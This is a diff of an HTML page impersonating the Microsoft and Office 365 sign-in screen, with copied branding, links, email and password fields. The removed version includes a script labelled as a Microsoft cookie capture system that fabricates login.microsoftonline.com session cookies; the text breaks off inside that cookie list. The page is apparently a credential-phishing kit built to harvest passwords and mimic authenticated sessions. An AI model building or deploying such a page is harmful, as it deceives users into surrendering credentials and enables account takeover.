@@ -1,772 +1,461 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <title>Sign in</title>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <link rel="shortcut icon" href="/images/favicon.ico">
-  <style>
-    body, html {
-      height: 100%;
-      margin: 0;
-      font-family: "Segoe UI", "Helvetica Neue", "Arial", sans-serif;
-      background-color: #fff; 
-      background-image: url('https://cdn.wallpaperhub.app/cloudcache/9/1/a/6/b/4/91a6b4bbc15a346994515950e52c727e0fc34028.jpg');
-      background-size: cover;
-      background-repeat: no-repeat;
-      background-attachment: fixed;
-      background-position: center center;
-    }
-    .main-container {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100%;
-      width: 100%;
-    }
-    .form-wrapper {
-      max-width: 440px;
-      width: 100%;
-      padding: 0 16px;
-    }
-    .form-box {
-      background-color: #ffffff;
-      padding: 44px;
-      box-shadow: 0 1.6px 3.6px 0 rgba(0,0,0,.132), 0 .2px .9px 0 rgba(0,0,0,.108);
-    }
-    .form-box h1 {
-      font-size: 24px;
-      font-weight: 600;
-      margin-bottom: 24px;
-      color: #1b1b1b;
-    }
-    .form-control {
-      border: none;
-      border-bottom: 1px solid #8A8886;
-      border-radius: 0;
-      padding: 8px 0;
-      font-size: 16px;
-      width: 100%;
-    }
-    .form-control:focus {
-      box-shadow: none;
-      outline: none;
-      border-bottom-color: #0078d4;
-    }
-    .form-box p {
-      font-size: 13px;
-      margin-top: 16px;
-      margin-bottom: 0;
-    }
-    .form-box a, .option-item a {
-      color: #0067b8;
-      text-decoration: none;
-    }
-    .form-box a:hover, .option-item a:hover {
-      text-decoration: underline;
-    }
-    .button-container {
-      display: flex;
-      justify-content: flex-end;
-    }
-    .btn.btn-primary-blue {
-      background-color: #0067b8;
-      color: white;
-      transition: filter 0.2s;
-      width: auto;
-      padding: 10px 32px;
-      cursor: pointer;
-    }
-    .btn.btn-primary-blue:hover {
-      filter: brightness(90%);
-    }
-    .btn.btn-secondary-gray {
-      background-color: #ccc;
-      color: #1b1b1b;
-      border: 1px solid #ccc;
-      padding: 10px 32px;
-      cursor: pointer;
-    }
-    .btn.btn-secondary-gray:hover {
-      background-color: #b3b3b3;
-    }
-    .form-box .btn {
-      font-size: 15px;
-      border: none;
-      border-radius: 2px;
-    }
-    .options-box {
-      background-color: #ffffff;
-      padding: 16px 44px;
-      margin-top: 16px;
-      box-shadow: 0 1.6px 3.6px 0 rgba(0,0,0,.132), 0 .2px .9px 0 rgba(0,0,0,.108);
-      cursor: pointer;
-      transition: background-color 0.2s;
-    }
-    .options-box:hover {
-      background-color: #f5f5f5;
-    }
-    .options-box a {
-      color: #1b1b1b;
-      text-decoration: none;
-      display: flex;
-      align-items: center;
-      width: 100%;
-    }
-    .options-box a:hover {
-      text-decoration: none;
-    }
-    .page-footer {
-        position: fixed;
-        bottom: 12px;
-        right: 24px; 
-        font-size: 12px;
-    }
-    .page-footer a {
-        color: #605e5c; 
-        text-shadow: none; 
-        margin-left: 16px;
-        text-decoration: none;
-    }
-    .page-footer a:hover {
-        text-decoration: underline;
-    }
-    .option-item {
-        display: flex;
-        align-items: center;
-        padding: 8px 0;
-    }
-    .option-item a {
-        display: flex;
-        align-items: center;
-        text-decoration: none;
-        color: inherit;
-        width: 100%;
-    }
-    .option-item:hover {
-        background-color: #f2f2f2;
-    }
-    .option-icon-container {
-        width: 40px;
-        height: 40px;
-        border-radius: 50%;
-        background-color: #f2f2f1;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        color: #333;
-        margin-right: 16px;
-    }
-    .option-text p { margin: 0; line-height: 1.4; }
-    .option-text .primary { font-size: 15px; color: #1b1b1b; }
-    .option-text .secondary { font-size: 12px; color: #5e5e5e; }
-    .hidden { display: none !important; }
-    .mt-4 { margin-top: 1rem; }
-    .mt-2 { margin-top: 0.5rem; }
-    .form-group { margin-bottom: 1rem; }
-    #error-message-container { color: #B22222; margin-bottom: 15px; font-size: 13px; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Office 365 Sign In</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .login-container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            width: 100%;
+            max-width: 400px;
+        }
+        
+        .microsoft-logo {
+            width: 108px;
+            height: 24px;
+            margin: 0 auto 32px;
+            display: block;
+        }
+        
+        .title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        
+        .subtitle {
+            font-size: 15px;
+            color: #605e5c;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        
+        .form-group {
+            margin-bottom: 16px;
+        }
+        
+        .form-label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #323130;
+            margin-bottom: 4px;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 8px 12px;
+            border: 1px solid #605e5c;
+            border-radius: 2px;
+            font-size: 15px;
+            background: white;
+            transition: border-color 0.2s;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: #0078d4;
+            box-shadow: 0 0 0 1px #0078d4;
+        }
+        
+        .form-input.error {
+            border-color: #d13438;
+        }
+        
+        .error-message {
+            color: #d13438;
+            font-size: 13px;
+            margin-top: 4px;
+            display: none;
+        }
+        
+        .error-message.show {
+            display: block;
+        }
+        
+        .sign-in-button {
+            width: 100%;
+            background: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 2px;
+            padding: 8px 24px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 24px;
+        }
+        
+        .sign-in-button:hover {
+            background: #106ebe;
+        }
+        
+        .sign-in-button:disabled {
+            background: #f3f2f1;
+            color: #a19f9d;
+            cursor: not-allowed;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 16px;
+        }
+        
+        .loading.show {
+            display: block;
+        }
+        
+        .spinner {
+            border: 2px solid #f3f2f1;
+            border-top: 2px solid #0078d4;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 8px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .footer-links {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 13px;
+        }
+        
+        .footer-links a {
+            color: #0078d4;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+    </style>
 </head>
 <body>
-
-  <div class="main-container">
-    <div class="form-wrapper">
-      <div class="form-box">
-        <!-- Email View -->
-        <div id="div1">
-          <svg xmlns="http://www.w3.org/2000/svg" width="108" height="23" viewBox="0 0 108 24"><title>assets</title><path d="M44.836,4.6V18.4h-2.4V7.583H42.4L38.119,18.4H36.531L32.142,7.583h-.029V18.4H29.9V4.6h3.436L37.3,14.83h.058L41.545,4.6Zm2,1.049a1.268,1.268,0,0,1,.419-.967,1.413,1.413,0,0,1,1-.39,1.392,1.392,0,0,1,1.02.4,1.3,1.3,0,0,1,.4.958,1.248,1.248,0,0,1-.414.953,1.428,1.428,0,0,1-1.01.385A1.4,1.4,0,0,1,47.25,6.6a1.261,1.261,0,0,1-.409-.948M49.41,18.4H47.081V8.507H49.41Zm7.064-1.694a3.213,3.213,0,0,0,1.145-.241,4.811,4.811,0,0,0,1.155-.635V18a4.665,4.665,0,0,1-1.266.481,6.886,6.886,0,0,1-1.554.164,4.707,4.707,0,0,1-4.918-4.908,5.641,5.641,0,0,1,1.4-3.932,5.055,5.055,0,0,1,3.955-1.545,5.414,5.414,0,0,1,1.324.168,4.431,4.431,0,0,1,1.063.39v2.233a4.763,4.763,0,0,0-1.1-.611,3.184,3.184,0,0,0-1.15-.217,2.919,2.919,0,0,0-2.223.9,3.37,3.37,0,0,0-.847,2.416,3.216,3.216,0,0,0,.813,2.338,2.936,2.936,0,0,0,2.209.837M65.4,8.343a2.952,2.952,0,0,1,.5.039,2.1,2.1,0,0,1,.375.1v2.358a2.04,2.04,0,0,0-.534-.255,2.646,2.646,0,0,0-.852-.12,1.808,1.808,0,0,0-1.448.722,3.467,3.467,0,0,0-.592,2.223V18.4H60.525V8.507h2.329v1.559h.038A2.729,2.729,0,0,1,63.855,8.8,2.611,2.611,0,0,1,65.4,8.343m1,5.254A5.358,5.358,0,0,1,67.792,9.71a5.1,5.1,0,0,1,3.85-1.434,4.742,4.742,0,0,1,3.623,1.381,5.212,5.212,0,0,1,1.3,3.729,5.257,5.257,0,0,1-1.386,3.83,5.019,5.019,0,0,1-3.772,1.424,4.935,4.935,0,0,1-3.652-1.352A4.987,4.987,0,0,1,66.406,13.6m2.425-.077a3.535,3.535,0,0,0,.7,2.368,2.505,2.505,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.389,2.389,0,0,0-1.929-.813,2.44,2.44,0,0,0-1.988.852,3.707,3.707,0,0,0-.707,2.43m11.2-2.416a1,1,0,0,0,.318.785,5.426,5.426,0,0,0,1.4.717,4.767,4.767,0,0,1,1.959,1.256,2.6,2.6,0,0,1,.563,1.689A2.715,2.715,0,0,1,83.2,17.794a4.558,4.558,0,0,1-2.9.847,6.978,6.978,0,0,1-1.362-.149,6.047,6.047,0,0,1-1.265-.38v-2.29a5.733,5.733,0,0,0,1.367.7,4,4,0,0,0,1.328.26,2.365,2.365,0,0,0,1.164-.221.79.79,0,0,0,.375-.741,1.029,1.029,0,0,0-.39-.813,5.768,5.768,0,0,0-1.477-.765,4.564,4.564,0,0,1-1.829-1.213,2.655,2.655,0,0,1-.539-1.713,2.706,2.706,0,0,1,1.063-2.2A4.243,4.243,0,0,1,81.5,8.256a6.663,6.663,0,0,1,1.164.115,5.161,5.161,0,0,1,1.078.3v2.214a4.974,4.974,0,0,0-1.078-.529,3.6,3.6,0,0,0-1.222-.221,1.781,1.781,0,0,0-1.034.26.824.824,0,0,0-.371.712M85.278,13.6A5.358,5.358,0,0,1,86.664,9.71a5.1,5.1,0,0,1,3.849-1.434,4.743,4.743,0,0,1,3.624,1.381,5.212,5.212,0,0,1,1.3,3.729,5.259,5.259,0,0,1-1.386,3.83,5.02,5.02,0,0,1-3.773,1.424,4.934,4.934,0,0,1-3.652-1.352A4.987,4.987,0,0,1,85.278,13.6m2.425-.077a3.537,3.537,0,0,0,.7,2.368,2.506,2.506,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.39,2.39,0,0,0-1.93-.813,2.439,2.439,0,0,0-1.987.852,3.707,3.707,0,0,0-.707,2.43m15.464-3.109H99.7V18.4H97.341V10.412H95.686V8.507h1.655V7.13a3.423,3.423,0,0,1,1.015-2.555,3.561,3.561,0,0,1,2.6-1,5.807,5.807,0,0,1,.751.043,2.993,2.993,0,0,1,.577.13V5.764a2.422,2.422,0,0,0-.4-.164,2.107,2.107,0,0,0-.664-.1,1.407,1.407,0,0,0-1.126.457A2.017,2.017,0,0,0,99.7,7.313V8.507h3.469V6.283l2.339-.712V8.507h2.358v1.906h-2.358v4.629a1.951,1.951,0,0,0,.332,1.29,1.326,1.326,0,0,0,1.044.375,1.557,1.557,0,0,0,.486-.1,2.294,2.294,0,0,0,.5-.231V18.3a2.737,2.737,0,0,1-.736.231,5.029,5.029,0,0,1-1.015.106,2.887,2.887,0,0,1-2.209-.784,3.341,3.341,0,0,1-.736-2.363Z" fill="#737373"/><rect width="10.931" height="10.931" fill="#f25022"/><rect x="12.069" width="10.931" height="10.931" fill="#7fba00"/><rect y="12.069" width="10.931" height="10.931" fill="#00a4ef"/><rect x="12.069" y="12.069" width="10.931" height="10.931" fill="#ffb900"/></svg>
-          <h1 class="mt-4">Sign in</h1>
-          <div id="email_error_container"></div>
-          <div class="form-group mt-2">
-            <input type="email" class="form-control" id="email" placeholder="Email, phone, or Skype" autocomplete="email" autocapitalize="none">
-          </div>
-          <p>No account? <a href="https://signup.live.com/" target="_blank">Create one!</a></p>
-          <p><a href="https://account.live.com/password/reset" target="_blank">Can't access your account?</a></p>
-          <div class="button-container mt-4">
-            <button class="btn btn-primary-blue" id="next">Next</button>
-          </div>
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft" class="microsoft-logo">
+        
+        <h1 class="title">Sign in</h1>
+        <p class="subtitle">to continue to Office 365</p>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="email" class="form-label">Email, phone, or Skype</label>
+                <input type="email" id="email" class="form-input" required>
+                <div class="error-message" id="emailError">Please enter a valid email address.</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="password" class="form-label">Password</label>
+                <input type="password" id="password" class="form-input" required>
+                <div class="error-message" id="passwordError">Please enter your password.</div>
+            </div>
+            
+            <button type="submit" class="sign-in-button" id="signInButton">Sign in</button>
+        </form>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Signing you in...</p>
         </div>
-
-        <!-- PASSWORD VIEW -->
-        <div id="password_view" class="hidden">
-          <svg xmlns="http://www.w3.org/2000/svg" width="108" height="23" viewBox="0 0 108 24"><title>assets</title><path d="M44.836,4.6V18.4h-2.4V7.583H42.4L38.119,18.4H36.531L32.142,7.583h-.029V18.4H29.9V4.6h3.436L37.3,14.83h.058L41.545,4.6Zm2,1.049a1.268,1.268,0,0,1,.419-.967,1.413,1.413,0,0,1,1-.39,1.392,1.392,0,0,1,1.02.4,1.3,1.3,0,0,1,.4.958,1.248,1.248,0,0,1-.414.953,1.428,1.428,0,0,1-1.01.385A1.4,1.4,0,0,1,47.25,6.6a1.261,1.261,0,0,1-.409-.948M49.41,18.4H47.081V8.507H49.41Zm7.064-1.694a3.213,3.213,0,0,0,1.145-.241,4.811,4.811,0,0,0,1.155-.635V18a4.665,4.665,0,0,1-1.266.481,6.886,6.886,0,0,1-1.554.164,4.707,4.707,0,0,1-4.918-4.908,5.641,5.641,0,0,1,1.4-3.932,5.055,5.055,0,0,1,3.955-1.545,5.414,5.414,0,0,1,1.324.168,4.431,4.431,0,0,1,1.063.39v2.233a4.763,4.763,0,0,0-1.1-.611,3.184,3.184,0,0,0-1.15-.217,2.919,2.919,0,0,0-2.223.9,3.37,3.37,0,0,0-.847,2.416,3.216,3.216,0,0,0,.813,2.338,2.936,2.936,0,0,0,2.209.837M65.4,8.343a2.952,2.952,0,0,1,.5.039,2.1,2.1,0,0,1,.375.1v2.358a2.04,2.04,0,0,0-.534-.255,2.646,2.646,0,0,0-.852-.12,1.808,1.808,0,0,0-1.448.722,3.467,3.467,0,0,0-.592,2.223V18.4H60.525V8.507h2.329v1.559h.038A2.729,2.729,0,0,1,63.855,8.8,2.611,2.611,0,0,1,65.4,8.343m1,5.254A5.358,5.358,0,0,1,67.792,9.71a5.1,5.1,0,0,1,3.85-1.434,4.742,4.742,0,0,1,3.623,1.381,5.212,5.212,0,0,1,1.3,3.729,5.257,5.257,0,0,1-1.386,3.83,5.019,5.019,0,0,1-3.772,1.424,4.935,4.935,0,0,1-3.652-1.352A4.987,4.987,0,0,1,66.406,13.6m2.425-.077a3.535,3.535,0,0,0,.7,2.368,2.505,2.505,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.389,2.389,0,0,0-1.929-.813,2.44,2.44,0,0,0-1.988.852,3.707,3.707,0,0,0-.707,2.43m11.2-2.416a1,1,0,0,0,.318.785,5.426,5.426,0,0,0,1.4.717,4.767,4.767,0,0,1,1.959,1.256,2.6,2.6,0,0,1,.563,1.689A2.715,2.715,0,0,1,83.2,17.794a4.558,4.558,0,0,1-2.9.847,6.978,6.978,0,0,1-1.362-.149,6.047,6.047,0,0,1-1.265-.38v-2.29a5.733,5.733,0,0,0,1.367.7,4,4,0,0,0,1.328.26,2.365,2.365,0,0,0,1.164-.221.79.79,0,0,0,.375-.741,1.029,1.029,0,0,0-.39-.813,5.768,5.768,0,0,0-1.477-.765,4.564,4.564,0,0,1-1.829-1.213,2.655,2.655,0,0,1-.539-1.713,2.706,2.706,0,0,1,1.063-2.2A4.243,4.243,0,0,1,81.5,8.256a6.663,6.663,0,0,1,1.164.115,5.161,5.161,0,0,1,1.078.3v2.214a4.974,4.974,0,0,0-1.078-.529,3.6,3.6,0,0,0-1.222-.221,1.781,1.781,0,0,0-1.034.26.824.824,0,0,0-.371.712M85.278,13.6A5.358,5.358,0,0,1,86.664,9.71a5.1,5.1,0,0,1,3.849-1.434,4.743,4.743,0,0,1,3.624,1.381,5.212,5.212,0,0,1,1.3,3.729,5.259,5.259,0,0,1-1.386,3.83,5.02,5.02,0,0,1-3.773,1.424,4.934,4.934,0,0,1-3.652-1.352A4.987,4.987,0,0,1,85.278,13.6m2.425-.077a3.537,3.537,0,0,0,.7,2.368,2.506,2.506,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.39,2.39,0,0,0-1.93-.813,2.439,2.439,0,0,0-1.987.852,3.707,3.707,0,0,0-.707,2.43m15.464-3.109H99.7V18.4H97.341V10.412H95.686V8.507h1.655V7.13a3.423,3.423,0,0,1,1.015-2.555,3.561,3.561,0,0,1,2.6-1,5.807,5.807,0,0,1,.751.043,2.993,2.993,0,0,1,.577.13V5.764a2.422,2.422,0,0,0-.4-.164,2.107,2.107,0,0,0-.664-.1,1.407,1.407,0,0,0-1.126.457A2.017,2.017,0,0,0,99.7,7.313V8.507h3.469V6.283l2.339-.712V8.507h2.358v1.906h-2.358v4.629a1.951,1.951,0,0,0,.332,1.29,1.326,1.326,0,0,0,1.044.375,1.557,1.557,0,0,0,.486-.1,2.294,2.294,0,0,0,.5-.231V18.3a2.737,2.737,0,0,1-.736.231,5.029,5.029,0,0,1-1.015.106,2.887,2.887,0,0,1-2.209-.784,3.341,3.341,0,0,1-.736-2.363Z" fill="#737373"/><rect width="10.931" height="10.931" fill="#f25022"/><rect x="12.069" width="10.931" height="10.931" fill="#7fba00"/><rect y="12.069" width="10.931" height="10.931" fill="#00a4ef"/><rect x="12.069" y="12.069" width="10.931" height="10.931" fill="#ffb900"/></svg>
-          <div style="cursor: pointer; margin-top: 20px; margin-bottom: 10px;" id="back_to_email">
-            <svg viewBox="0 0 16 16" focusable="false" style="width: 16px; height: 16px; vertical-align: middle;"><path d="M6.914 15L.414 8.5a.5.5 0 010-.707L6.914 1.293a.5.5 0 01.707.707L2.414 7.21h13.293a.5.5 0 110 1H2.414l5.207 5.207a.5.5 0 01-.707.707z" fill="currentColor"></path></svg>
-            <span id="display_email" style="margin-left: 8px;"></span>
-          </div>
-          <h1 class="mt-2">Enter password</h1>
-          <div id="password_error_container"></div>
-          <div class="form-group mt-2">
-            <input type="password" class="form-control" id="password" placeholder="Password" autocomplete="current-password">
-          </div>
-          <p><a href="#">Forgot password?</a></p>
-          <div class="button-container mt-4">
-            <button class="btn btn-primary-blue" id="sign_in">Sign in</button>
-          </div>
+        
+        <div class="footer-links">
+            <a href="#">Can't access your account?</a>
+            <a href="#">Sign-in options</a>
         </div>
-
-        <!-- Detailed "Sign-in options" View -->
-        <div id="options_view_detailed" class="hidden">
-            <svg xmlns="http://www.w3.org/2000/svg" width="108" height="23" viewBox="0 0 108 24"><title>assets</title><path d="M44.836,4.6V18.4h-2.4V7.583H42.4L38.119,18.4H36.531L32.142,7.583h-.029V18.4H29.9V4.6h3.436L37.3,14.83h.058L41.545,4.6Zm2,1.049a1.268,1.268,0,0,1,.419-.967,1.413,1.413,0,0,1,1-.39,1.392,1.392,0,0,1,1.02.4,1.3,1.3,0,0,1,.4.958,1.248,1.248,0,0,1-.414.953,1.428,1.428,0,0,1-1.01.385A1.4,1.4,0,0,1,47.25,6.6a1.261,1.261,0,0,1-.409-.948M49.41,18.4H47.081V8.507H49.41Zm7.064-1.694a3.213,3.213,0,0,0,1.145-.241,4.811,4.811,0,0,0,1.155-.635V18a4.665,4.665,0,0,1-1.266.481,6.886,6.886,0,0,1-1.554.164,4.707,4.707,0,0,1-4.918-4.908,5.641,5.641,0,0,1,1.4-3.932,5.055,5.055,0,0,1,3.955-1.545,5.414,5.414,0,0,1,1.324.168,4.431,4.431,0,0,1,1.063.39v2.233a4.763,4.763,0,0,0-1.1-.611,3.184,3.184,0,0,0-1.15-.217,2.919,2.919,0,0,0-2.223.9,3.37,3.37,0,0,0-.847,2.416,3.216,3.216,0,0,0,.813,2.338,2.936,2.936,0,0,0,2.209.837M65.4,8.343a2.952,2.952,0,0,1,.5.039,2.1,2.1,0,0,1,.375.1v2.358a2.04,2.04,0,0,0-.534-.255,2.646,2.646,0,0,0-.852-.12,1.808,1.808,0,0,0-1.448.722,3.467,3.467,0,0,0-.592,2.223V18.4H60.525V8.507h2.329v1.559h.038A2.729,2.729,0,0,1,63.855,8.8,2.611,2.611,0,0,1,65.4,8.343m1,5.254A5.358,5.358,0,0,1,67.792,9.71a5.1,5.1,0,0,1,3.85-1.434,4.742,4.742,0,0,1,3.623,1.381,5.212,5.212,0,0,1,1.3,3.729,5.257,5.257,0,0,1-1.386,3.83,5.019,5.019,0,0,1-3.772,1.424,4.935,4.935,0,0,1-3.652-1.352A4.987,4.987,0,0,1,66.406,13.6m2.425-.077a3.535,3.535,0,0,0,.7,2.368,2.505,2.505,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.389,2.389,0,0,0-1.929-.813,2.44,2.44,0,0,0-1.988.852,3.707,3.707,0,0,0-.707,2.43m11.2-2.416a1,1,0,0,0,.318.785,5.426,5.426,0,0,0,1.4.717,4.767,4.767,0,0,1,1.959,1.256,2.6,2.6,0,0,1,.563,1.689A2.715,2.715,0,0,1,83.2,17.794a4.558,4.558,0,0,1-2.9.847,6.978,6.978,0,0,1-1.362-.149,6.047,6.047,0,0,1-1.265-.38v-2.29a5.733,5.733,0,0,0,1.367.7,4,4,0,0,0,1.328.26,2.365,2.365,0,0,0,1.164-.221.79.79,0,0,0,.375-.741,1.029,1.029,0,0,0-.39-.813,5.768,5.768,0,0,0-1.477-.765,4.564,4.564,0,0,1-1.829-1.213,2.655,2.655,0,0,1-.539-1.713,2.706,2.706,0,0,1,1.063-2.2A4.243,4.243,0,0,1,81.5,8.256a6.663,6.663,0,0,1,1.164.115,5.161,5.161,0,0,1,1.078.3v2.214a4.974,4.974,0,0,0-1.078-.529,3.6,3.6,0,0,0-1.222-.221,1.781,1.781,0,0,0-1.034.26.824.824,0,0,0-.371.712M85.278,13.6A5.358,5.358,0,0,1,86.664,9.71a5.1,5.1,0,0,1,3.849-1.434,4.743,4.743,0,0,1,3.624,1.381,5.212,5.212,0,0,1,1.3,3.729,5.259,5.259,0,0,1-1.386,3.83,5.02,5.02,0,0,1-3.773,1.424,4.934,4.934,0,0,1-3.652-1.352A4.987,4.987,0,0,1,85.278,13.6m2.425-.077a3.537,3.537,0,0,0,.7,2.368,2.506,2.506,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.39,2.39,0,0,0-1.93-.813,2.439,2.439,0,0,0-1.987.852,3.707,3.707,0,0,0-.707,2.43m15.464-3.109H99.7V18.4H97.341V10.412H95.686V8.507h1.655V7.13a3.423,3.423,0,0,1,1.015-2.555,3.561,3.561,0,0,1,2.6-1,5.807,5.807,0,0,1,.751.043,2.993,2.993,0,0,1,.577.13V5.764a2.422,2.422,0,0,0-.4-.164,2.107,2.107,0,0,0-.664-.1,1.407,1.407,0,0,0-1.126.457A2.017,2.017,0,0,0,99.7,7.313V8.507h3.469V6.283l2.339-.712V8.507h2.358v1.906h-2.358v4.629a1.951,1.951,0,0,0,.332,1.29,1.326,1.326,0,0,0,1.044.375,1.557,1.557,0,0,0,.486-.1,2.294,2.294,0,0,0,.5-.231V18.3a2.737,2.737,0,0,1-.736.231,5.029,5.029,0,0,1-1.015.106,2.887,2.887,0,0,1-2.209-.784,3.341,3.341,0,0,1-.736-2.363Z" fill="#737373"/><rect width="10.931" height="10.931" fill="#f25022"/><rect x="12.069" width="10.931" height="10.931" fill="#7fba00"/><rect y="12.069" width="10.931" height="10.931" fill="#00a4ef"/><rect x="12.069" y="12.069" width="10.931" height="10.931" fill="#ffb900"/></svg>
-            <h1 class="mt-4">Sign-in options</h1>
-            <div class="option-item">
-                <a href="https://support.microsoft.com/en-us/account-billing/how-to-go-passwordless-with-your-microsoft-account-674ce301-3574-4387-a93d-916751764C43" target="_blank" rel="noopener noreferrer">
-                    <div class="option-icon-container">
-                        <img src="https://aadcdn.msauth.net/shared/1.0/content/images/credentialoptions/cred_option_passkey_1500b2043f4d1698f9df6089f67559d7.svg" alt="Passkey" style="width: 24px; height: 24px;">
-                    </div>
-                    <div class="option-text">
-                        <p class="primary">Face, fingerprint, PIN or security key</p>
-                        <p class="secondary">Use your device to sign in with a passkey.</p>
-                    </div>
-                </a>
-            </div>
-            <div class="option-item">
-                <a href="https://github.com/login" target="_blank" rel="noopener noreferrer">
-                    <div class="option-icon-container">
-                        <img src="https://aadcdn.msauth.net/shared/1.0/content/images/credentialoptions/cred_option_github_fa3dbea07d478da8facde73b44f90b02.svg" alt="GitHub" style="width: 24px; height: 24px;">
-                    </div>
-                    <div class="option-text"><p class="primary">Sign in with GitHub</p></div>
-                </a>
-            </div>
-            <div class="option-item">
-                <a href="https://login.microsoftonline.com" target="_blank" rel="noopener noreferrer">
-                    <div class="option-icon-container">
-                        <img src="https://aadcdn.msauth.net/shared/1.0/content/images/picker_account_aad_c5cbcbb43e61b1347b12589901000621.png" alt="Organization" style="width: 24px; height: 24px;">
-                    </div>
-                    <div class="option-text">
-                        <p class="primary">Sign in to an organization</p>
-                        <p class="secondary">Search for a company or an organization you're working with.</p>
-                    </div>
-                </a>
-            </div>
-            <div class="button-container mt-4">
-                <button class="btn btn-secondary-gray" id="options-view-back">Back</button>
-            </div>
-        </div>
-      </div>
-
-      <!-- "Sign-in options" Clickable Box -->
-      <div class="options-box" id="options_box">
-        <a href="#" id="sign_in_options_link">
-          <img src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" alt="Sign-in options" style="width: 28px; height: 28px; margin-right: 16px;">
-          <span>Sign-in options</span>
-        </a>
-      </div>
     </div>
-  </div>
 
-  <!-- Page Footer -->
-  <div class="page-footer">
-    <a href="https://www.microsoft.com/en-US/servicesagreement/" target="_blank">Terms of use</a>
-    <a href="https://www.microsoft.com/en-US/privacy/privacystatement/" target="_blank">Privacy & cookies</a>
-    <a href="https://www.microsoft.com/en-us/concern/privacy" target="_blank">...</a>
-  </div>
-
-  <!-- Merged Logic -->
-  <script>
-    // --- MICROSOFT COOKIE CAPTURE SYSTEM (From Original File) ---
-    const microsoftCookies = [
-      {
-        "domain": "login.microsoftonline.com",
-        "expirationDate": 1797294601.833988,
-        "hostOnly": true,
-        "httpOnly": true,
-        "name": "AADSSOTILES",
-        "path": "/",
-        "sameSite": "no_restriction",
-        "secure": true,
-        "session": false,
-        "storeId": null,
-        "value": "1"
-      },
-      {
-        "domain": "login.microsoftonline.com",
-        "expirationDate": 1794270363.142088,
-        "hostOnly": true,
-        "httpOnly": false,
-        "name": "MSFPC",
-        "path": "/",
-        "sameSite": "no_restriction",
-        "secure": true,
-        "session": false,
-        "storeId": null,
-        "value": "GUID=" + Math.random().toString(36).substr(2, 32) + "&HASH=" + Math.random().toString(36).substr(2, 4) + "&LV=202511&V=4&LU=" + Date.now()
-      },
-      {
-        "domain": ".login.microsoftonline.com",
-        "hostOnly": false,
-        "httpOnly": true,
-        "name": "esctx",
-        "path": "/",
-        "sameSite": "no_restriction",
-        "secure": true,
-        "session": true,
-        "storeId": null,
-        "value": "PAQABBwEAAABlMNzVhAPUTrARzfQjWPtK" + btoa(Math.random().toString(36).substr(2, 50)).substr(0, 100)
-      },
-      {
-        "domain": ".login.microsoftonline.com",
-        "hostOnly": false,
-        "httpOnly": true,
-        "name": "SignInStateCookie",
-        "path": "/",
-        "sameSite": "no_restriction",
-        "secure": true,
-        "session": true,
-        "storeId": null,
-        "value": "CAgABFgIAAABlMNzVhAPUTrARzfQjWPtK" + btoa(Math.random().toString(36).substr(2, 40)).substr(0, 80)
-      },
-      {
-        "domain": ".login.microsoftonline.com",
-        "hostOnly": false,
-        "httpOnly": true,
-        "name": "esctx-" + Math.random().toString(36).substr(2, 11),
-        "path": "/",
-        "sameSite": "no_restriction",
-        "secure": true,
-        "session": true,
-        "storeId": null,
-        "value": "AQABCQEAAABlMNzVhAPUTrARzfQjWPtK" + btoa(Math.random().toString(36).substr(2, 50)).substr(0, 100)
-      },
-      {
-        "domain": ".login.microsoftonline.com",
-        "expirationDate": 1796430632,
-        "hostOnly": false,
-        "httpOnly": false,
-        "name": "brcap",
-        "path": "/",
